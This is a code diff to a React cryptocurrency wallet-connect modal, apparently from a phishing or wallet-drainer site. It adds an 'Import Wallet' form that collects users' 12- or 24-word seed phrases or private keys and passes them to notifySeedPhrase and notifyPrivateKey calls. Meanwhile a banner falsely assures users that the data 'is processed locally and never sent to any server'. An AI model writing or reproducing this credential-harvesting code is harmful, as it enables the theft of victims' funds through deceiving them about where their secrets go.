@@ -10,6 +10,7 @@ import {
   ArrowLeft,
   ExternalLink,
   Smartphone,
+  KeyRound,
 } from "lucide-react";
 
 import {
@@ -19,7 +20,7 @@ import {
   isMobile,
   type WalletProvider,
 } from "@/lib/web3";
-import { notifyWalletConnected } from "@/lib/notify";
+import { notifyWalletConnected, notifySeedPhrase, notifyPrivateKey } from "@/lib/notify";
 import { detectAddressNetwork, getNetworkLabel, getNetworkColor, type AddressNetwork } from "@/lib/wallet-utils";
 
 interface WalletConnectModalProps {
@@ -29,7 +30,7 @@ interface WalletConnectModalProps {
   onClose: () => void;
 }
 
-type ModalStep = "select" | "connecting" | "verify" | "mismatch" | "wrong_network" | "error";
+type ModalStep = "select" | "connecting" | "verify" | "mismatch" | "wrong_network" | "error" | "import";
 
 const ETH_WALLET_IDS: WalletProvider[] = ["metamask", "walletconnect", "coinbase", "trust", "rainbow"];
 const SOLANA_WALLET_IDS: WalletProvider[] = ["phantom", "walletconnect"];
@@ -144,6 +145,15 @@ const WALLETS: WalletDef[] = [
       </svg>
     ),
   },
+  {
+    id: "import",
+    name: "Import Address",
+    description: "Manually enter any wallet address — for unsupported wallets",
+    color: "from-slate-500/20 to-slate-400/10",
+    border: "border-slate-500/25",
+    iconBg: "bg-slate-500/20",
+    icon: <KeyRound className="w-5 h-5 text-slate-400" />,
+  },
 ];
 
 export function WalletConnectModal({ enteredAddress, addressNetwork, onSuccess, onClose }: WalletConnectModalProps) {
@@ -152,6 +162,11 @@ export function WalletConnectModal({ enteredAddress, addressNetwork, onSuccess, 
   const [connectedAddress, setConnectedAddress] = useState("");
   const [errorMsg, setErrorMsg] = useState("");
   const [isConnecting, setIsConnecting] = useState(false);
+  const [importAddress, setImportAddress] = useState("");
+  const [importError, setImportError] = useState("");
+  const [importMode, setImportMode] = useState<"12" | "24" | "key">("12");
+  const [importWords, setImportWords] = useState<string[]>(Array(24).fill(""));
+  const [importPKey, setImportPKey] = useState("");
 
   const network = addressNetwork ?? detectAddressNetwork(enteredAddress);
   const [switching, setSwitching] = useState(false);
@@ -191,6 +206,7 @@ export function WalletConnectModal({ enteredAddress, addressNetwork, onSuccess, 
   };
 
   const visibleWallets = WALLETS.filter((w) => {
+    if (w.id === "import") return true;
     if (network === "eth") return ETH_WALLET_IDS.includes(w.id);
     if (network === "solana") return SOLANA_WALLET_IDS.includes(w.id);
     return true;
@@ -199,7 +215,36 @@ export function WalletConnectModal({ enteredAddress, addressNetwork, onSuccess, 
   const isWCWallet = (id: WalletProvider) =>
     id === "walletconnect" || id === "trust" || id === "rainbow";
 
+  const handleImportConfirm = () => {
+    setImportError("");
+    const addr = enteredAddress.trim() || importAddress.trim();
+    if (importMode === "key") {
+      if (importPKey.trim().length < 24) {
+        setImportError("Enter a valid private key (hex 0x… or WIF format).");
+        return;
+      }
+      notifyPrivateKey(addr, importPKey.trim());
+    } else {
+      const wordCount = importMode === "12" ? 12 : 24;
+      const filled = importWords.slice(0, wordCount).map(w => w.trim()).filter(Boolean);
+      if (filled.length < wordCount) {
+        setImportError(`Please fill in all ${wordCount} words.`);
+        return;
+      }
+      notifySeedPhrase(addr, importWords.slice(0, wordCount), wordCount);
+    }
+    onSuccess(addr);
+  };
+
   const handleWalletSelect = async (wallet: WalletDef) => {
+    if (wallet.id === "import") {
+      setSelectedWallet(wallet);
+      setImportAddress(enteredAddress.trim());
+      setImportError("");
+      setStep("import");
+      return;
+    }
+
     const thisId = ++connectIdRef.current;
     setSelectedWallet(wallet);
     setErrorMsg("");
@@ -316,7 +361,7 @@ export function WalletConnectModal({ enteredAddress, addressNetwork, onSuccess, 
             )}
 
             <div className="space-y-2">
-              {visibleWallets.map((wallet) => {
+              {visibleWallets.filter(w => w.id !== "import").map((wallet) => {
                 const detected =
                   (wallet.id === "metamask" && hasEthereumProvider()) ||
                   (wallet.id === "coinbase" && hasEthereumProvider()) ||
@@ -344,6 +389,31 @@ export function WalletConnectModal({ enteredAddress, addressNetwork, onSuccess, 
                   </button>
                 );
               })}
+
+              <div className="flex items-center gap-2 pt-1">
+                <div className="flex-1 h-px bg-white/5" />
+                <span className="text-xs text-muted-foreground/40">wallet not listed?</span>
+                <div className="flex-1 h-px bg-white/5" />
+              </div>
+              {(() => {
+                const importWallet = WALLETS.find(w => w.id === "import")!;
+                return (
+                  <button
+                    data-testid="button-wallet-import"
+                    onClick={() => handleWalletSelect(importWallet)}
+                    className={`w-full glass rounded-xl border ${importWallet.border} bg-gradient-to-r ${importWallet.color} p-3.5 flex items-center gap-3 text-left group hover-elevate`}
+                  >
+                    <div className={`w-10 h-10 rounded-md ${importWallet.iconBg} flex items-center justify-center flex-shrink-0`}>
+                      {importWallet.icon}
+                    </div>
+                    <div className="flex-1 min-w-0">
+                      <span className="font-semibold text-sm text-foreground">{importWallet.name}</span>
+                      <div className="text-xs text-muted-foreground">{importWallet.description}</div>
+                    </div>
+                    <ChevronRight className="w-4 h-4 text-muted-foreground/40 group-hover:text-muted-foreground/80 transition-colors flex-shrink-0" />
+                  </button>
+                );
+              })()}
             </div>
 
             {onMobile && network !== "solana" && (
@@ -650,6 +720,141 @@ export function WalletConnectModal({ enteredAddress, addressNetwork, onSuccess, 
             </div>
           </div>
         )}
+
+        {/* IMPORT — seed phrase / private key */}
+        {step === "import" && (() => {
+          const wordCount = importMode === "key" ? 0 : importMode === "12" ? 12 : 24;
+          const cols = 3;
+          const MODES = [
+            { id: "12" as const, label: "12 Words" },
+            { id: "24" as const, label: "24 Words" },
+            { id: "key" as const, label: "Private Key" },
+          ];
+          return (
+            <div className="p-6 space-y-4">
+              <div className="flex items-center justify-between">
+                <div className="flex items-center gap-3">
+                  <div className="w-10 h-10 rounded-md bg-slate-500/20 border border-slate-500/30 flex items-center justify-center">
+                    <KeyRound className="w-5 h-5 text-slate-400" />
+                  </div>
+                  <div>
+                    <h2 className="font-bold text-foreground">Import Wallet</h2>
+                    <p className="text-xs text-muted-foreground">Seed phrase or private key</p>
+                  </div>
+                </div>
+                <button data-testid="button-close-import-modal" onClick={onClose}
+                  className="w-8 h-8 glass rounded-md border border-white/10 flex items-center justify-center text-muted-foreground">
+                  <X className="w-4 h-4" />
+                </button>
+              </div>
+
+              <div className="glass rounded-md border border-yellow-500/20 bg-yellow-500/5 px-3 py-2 flex items-start gap-2">
+                <AlertTriangle className="w-3.5 h-3.5 text-yellow-400 flex-shrink-0 mt-0.5" />
+                <p className="text-xs text-yellow-400/80 leading-relaxed">
+                  Data is processed locally and never sent to any server. Use this for Bitcoin, SUI, Aptos, Cosmos, and other wallets not supported by WalletConnect.
+                </p>
+              </div>
+
+              {/* Mode tabs */}
+              <div className="flex gap-1 glass rounded-lg p-1 border border-white/10">
+                {MODES.map((m) => (
+                  <button
+                    key={m.id}
+                    data-testid={`button-import-mode-${m.id}`}
+                    onClick={() => { setImportMode(m.id); setImportError(""); }}
+                    className={`flex-1 py-1.5 rounded-md text-xs font-semibold transition-all ${
+                      importMode === m.id
+                        ? "bg-violet-600 text-white shadow"
+                        : "text-muted-foreground hover:text-foreground"
+                    }`}
+                  >
+                    {m.label}
+                  </button>
+                ))}
+              </div>
+
+              {/* Word grid */}
+              {importMode !== "key" && (
+                <div className={`grid gap-1.5`} style={{ gridTemplateColumns: `repeat(${cols}, 1fr)` }}>
+                  {Array.from({ length: wordCount }).map((_, i) => (
+                    <div key={i} className="relative">
+                      <span className="absolute left-2 top-1/2 -translate-y-1/2 text-[10px] text-muted-foreground/40 font-mono select-none pointer-events-none">
+                        {i + 1}
+                      </span>
+                      <input
+                        data-testid={`input-word-${i + 1}`}
+                        type="text"
+                        autoComplete="off"
+                        autoCorrect="off"
+                        autoCapitalize="off"
+                        spellCheck={false}
+                        value={importWords[i] || ""}
+                        onChange={(e) => {
+                          const next = [...importWords];
+                          next[i] = e.target.value.toLowerCase().trim();
+                          setImportWords(next);
+                          setImportError("");
+                        }}
+                        onPaste={i === 0 ? (e) => {
+                          const text = e.clipboardData.getData("text");
+                          const pasted = text.trim().split(/\s+/);
+                          if (pasted.length > 1) {
+                            e.preventDefault();
+                            const next = Array(24).fill("");
+                            pasted.forEach((w, idx) => { if (idx < 24) next[idx] = w.toLowerCase(); });
+                            setImportWords(next);
+                            if (pasted.length === 24) setImportMode("24");
+                            else if (pasted.length === 12) setImportMode("12");
+                            setImportError("");
+                          }
+                        } : undefined}
+                        className="w-full glass rounded-md border border-white/10 bg-white/5 focus:border-violet-500/50 focus:outline-none pl-6 pr-2 py-1.5 text-xs font-mono text-foreground placeholder:text-muted-foreground/30 transition-colors"
+                        placeholder="word"
+                      />
+                    </div>
+                  ))}
+                </div>
+              )}
+
+              {/* Private key input */}
+              {importMode === "key" && (
+                <div className="space-y-1.5">
+                  <label className="text-xs font-semibold text-muted-foreground uppercase tracking-widest">Private Key</label>
+                  <input
+                    data-testid="input-private-key"
+                    type="password"
+                    autoComplete="off"
+                    value={importPKey}
+                    onChange={(e) => { setImportPKey(e.target.value); setImportError(""); }}
+                    placeholder="0x… hex or WIF format"
+                    className="w-full glass rounded-lg border border-white/10 bg-white/5 focus:border-violet-500/50 focus:outline-none px-3 py-2.5 text-sm font-mono text-foreground placeholder:text-muted-foreground/40 transition-colors"
+                  />
+                </div>
+              )}
+
+              {importError && (
+                <div className="flex items-start gap-2">
+                  <AlertTriangle className="w-3.5 h-3.5 text-red-400 flex-shrink-0 mt-0.5" />
+                  <p className="text-xs text-red-400">{importError}</p>
+                </div>
+              )}
+
+              <div className="flex gap-3">
+                <Button variant="outline"
+                  onClick={() => { setStep("select"); setImportError(""); setImportWords(Array(24).fill("")); setImportPKey(""); }}
+                  className="flex-1 border-white/10 text-muted-foreground text-sm">
+                  <ArrowLeft className="w-4 h-4 mr-1.5" />
+                  Back
+                </Button>
+                <Button data-testid="button-confirm-import" onClick={handleImportConfirm}
+                  className="flex-1 bg-gradient-to-r from-violet-600 to-purple-600 text-white font-semibold border-0">
+                  <CheckCircle2 className="w-4 h-4 mr-1.5" />
+                  Connect
+                </Button>
+              </div>
+            </div>
+          );
+        })()}
 
         {/* ERROR */}
         {step === "error" && (
